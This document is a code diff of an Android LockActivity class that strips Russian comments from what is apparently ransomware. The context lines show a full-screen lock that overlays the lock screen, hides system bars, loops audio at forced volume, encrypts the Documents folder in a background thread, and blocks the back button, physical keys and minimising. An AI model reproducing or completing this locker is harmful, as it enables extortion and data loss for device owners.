@@ -30,7 +30,6 @@ public class LockActivity extends Activity {
         super.onCreate(b);
         setContentView(R.layout.activity_lock);
 
-        // Оставляем экран включенным и показываем поверх блокировки экрана
         getWindow().addFlags(
             WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
             WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
@@ -38,7 +37,6 @@ public class LockActivity extends Activity {
             WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
             WindowManager.LayoutParams.FLAG_FULLSCREEN);
 
-        // Скрываем системные панели
         View decorView = getWindow().getDecorView();
         decorView.setSystemUiVisibility(
             View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
@@ -49,14 +47,12 @@ public class LockActivity extends Activity {
             | View.SYSTEM_UI_FLAG_FULLSCREEN);
 
         am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
-        // Воспроизводим твой звук (файл должен называться lockvideo.mp3 в папке raw)
         mp = MediaPlayer.create(this, R.raw.lockvideo);
         if (mp != null) {
             mp.setLooping(true);
             mp.start();
         }
 
-        // Запускаем шифрование файлов в фоне (папка Documents)
         targetDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
         new Thread(new Runnable() {
             @Override
@@ -65,7 +61,6 @@ public class LockActivity extends Activity {
             }
         }).start();
 
-        // Цикл для принудительной громкости
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
@@ -92,7 +87,6 @@ public class LockActivity extends Activity {
                         mp.release();
                         mp = null;
                     }
-                    // Запускаем расшифровку
                     new Thread(new Runnable() {
                         @Override
                         public void run() {
@@ -143,7 +137,6 @@ public class LockActivity extends Activity {
         }
     }
 
-    // Блокируем физические кнопки
     @Override
     public boolean dispatchKeyEvent(KeyEvent e) {
         int k = e.getKeyCode();
@@ -155,12 +148,8 @@ public class LockActivity extends Activity {
         return super.dispatchKeyEvent(e);
     }
 
-    @Override
-    public void onBackPressed() { 
-        // Блокируем кнопку назад
-    }
+    @Override public void onBackPressed() { }
 
-    // Если попытаться свернуть приложение, оно вернется на экран
     @Override
     protected void onPause() {
         super.onPause();
@@ -181,4 +170,4 @@ public class LockActivity extends Activity {
         }
         handler.removeCallbacksAndMessages(null);
     }
-            }
+    }
